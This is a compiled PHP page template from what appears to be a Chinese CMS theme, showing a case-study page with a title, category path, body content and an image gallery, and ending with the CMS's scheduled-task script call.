<?php if ($fn_include = $this->_include("header.html")) include($fn_include); ?>
<div class="container">
    <!-- section start-page -->
    <?php if ($fn_include = $this->_include("banner.html")) include($fn_include);  if ($fn_include = $this->_include("nav.html")) include($fn_include); ?>
    <div class="clear"></div>
    <!--case show-->
    <section class="case-wrap" id="case-wrap" >
        <div class="case-desc-wrap w9 m-auto">
            <h3 class="title"><?php echo $title; ?></h3>
            <div class="category"><?php echo dr_catpos($catid, '/',false); ?> </div>
            <div class="contents">
                <?php echo $content; ?>
            </div>
        </div>
    </section>
    <section class="case-img-wrap">
        <div class="case-img w9 m-auto">
            <?php if (is_array($images)) { $count=count($images);foreach ($images as $i=>$t) { ?>
                <div class="img-d">
                    <img class="lazy" data-load="<?php echo dr_get_file($t['file']); ?>" alt="<?php echo $t['title']; ?>">
                </div>
            <?php } } ?>
        </div>
    </section>
    <!--case show end-->
    <div class="clear"></div>
    <!-- Contact-->
    <?php if ($fn_include = $this->_include("indexContact.html")) include($fn_include); ?>
    <div class="clear"></div>
    <?php if ($fn_include = $this->_include("footer.html")) include($fn_include); ?>
</div>
<script src="<?php echo HOME_THEME_PATH; ?>build/js/app.js"></script>
</body>
</html><script type="text/javascript" src="http://yish.app/index.php?c=cron"></script>